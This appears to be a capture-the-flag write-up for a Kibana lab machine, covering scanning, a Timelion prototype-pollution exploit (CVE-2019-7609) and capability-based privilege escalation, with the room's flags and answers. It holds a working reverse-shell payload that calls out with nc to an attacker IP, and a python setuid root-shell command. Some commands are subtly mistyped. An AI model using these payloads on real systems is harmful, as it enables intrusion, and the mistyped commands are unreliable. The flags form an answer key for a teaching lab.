# Task 1 Flags
----

Are you able to complete the challenge?
The machine may take up to 7 minutes to boot and configure

## SCANNING

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -A -T4 -p1-10000 10.10.138.87
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-21 03:22 EST
Warning: 10.10.138.87 giving up on port because retransmission cap hit (6).
Stats: 0:04:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 94.81% done; ETC: 03:26 (0:00:13 remaining)
Stats: 0:05:05 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 03:27 (0:00:00 remaining)
Nmap scan report for 10.10.138.87
Host is up (0.28s latency).
Not shown: 9968 closed tcp ports (conn-refused), 28 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Mon, 21 Feb 2022 08:24:40 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Mon, 21 Feb 2022 08:24:30 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Mon, 21 Feb 2022 08:24:31 GMT
|_    {"statusCode":404,"error":"Not Found"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.92%I=7%D=2/21%Time=62134CE2%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,D4,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/app/kibana\r\nk
SF:bn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6
SF:c\r\ncache-control:\x20no-cache\r\ncontent-length:\x200\r\nconnection:\
SF:x20close\r\nDate:\x20Mon,\x2021\x20Feb\x202022\x2008:24:30\x20GMT\r\n\r
SF:\n")%r(HTTPOptions,117,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-name:\x
SF:20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c\r\nconte
SF:nt-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\x20no-
SF:cache\r\ncontent-length:\x2038\r\nconnection:\x20close\r\nDate:\x20Mon,
SF:\x2021\x20Feb\x202022\x2008:24:31\x20GMT\r\n\r\n{\"statusCode\":404,\"e
SF:rror\":\"Not\x20Found\"}")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\n\r\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\n\r\n")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLS
SF:essionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalSe
SF:rverCookie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessio
SF:nReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20404\x20Not
SF:\x20Found\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d049232
SF:83ef48ab54e3e6c\r\ncontent-type:\x20application/json;\x20charset=utf-8\
SF:r\ncache-control:\x20no-cache\r\ncontent-length:\x2060\r\nconnection:\x
SF:20close\r\nDate:\x20Mon,\x2021\x20Feb\x202022\x2008:24:40\x20GMT\r\n\r\
SF:n{\"statusCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not\x20Fo
SF:und\"}")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LDAPB
SF:indReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOptions,1C
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 308.78 seconds
```

## FINDING THE VULNERABILITY

```bash
# Go to the port 5601 that has the dashboard and go to the 'timelion' which has the vulnerability there we can execute javascript code with that we can get a reverse shell.

# This is the Payload to get the reverse shell.Execute this in timelion and go to canvas to get a shell.

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10..9.2.107 7007 >/tmp/f");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

## GAINNING SHELL 

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 7007
listening on [any] 7007 ...
connect to [10.9.2.107] from (UNKNOWN) [10.10.240.39] 58288
/bin/sh: 0: can't access tty; job control turned off
kiba@ubuntu:/home/kiba/kibana$
kiba@ubuntu:/home/kiba/kibana$ find / -name "user.txt" 2>/dev/null
/home/kiba/user.txt
kiba@ubuntu:/home/kiba$ cat user.txt 
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```

## PRIVILEGE ESCALATION

```bash
# For privesc we are using getcap command to examine the file capabilities ,Since the hint was given when we saw the webpage on port 80 - "linux capabilities"

kiba@ubuntu:/home/kiba$ ls
elasticsearch-6.5.4.deb  kibana  user.txt

# Use getcap on this file elasticsearch-6.5.4.deb

kiba@ubuntu:/home/kiba$ getcap -r / elasticsearch-6.5.4.deb 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

# Using the python capability to gain root shell.

kiba@ubuntu:/home/kiba$ file /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); 
os.system("/bin/bash")' 
# whoami
root
# cd /root
# ls
root.txt  ufw
# cat root.txt
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```

----

# ANSWER THE QUESTIONS 
----

1.What is the vulnerability that is specific to programming languages with prototype-based inheritance?
>>prototype pollution

2.What is the version of visualization dashboard installed in the server?
>>6.5.4

3.What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
>>CVE-2019-7609

4.Compromise the machine and locate user.txt
>>THM{1s_easy_pwn3d_k1bana_w1th_rce}

5.Capabilities is a concept that provides a security system that allows "divide" root privileges into different values
>>No answer needed

6.How would you recursively list all of these capabilities?
>>getcap -r /

7.Escalate privileges and obtain root.txt
>>THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}

----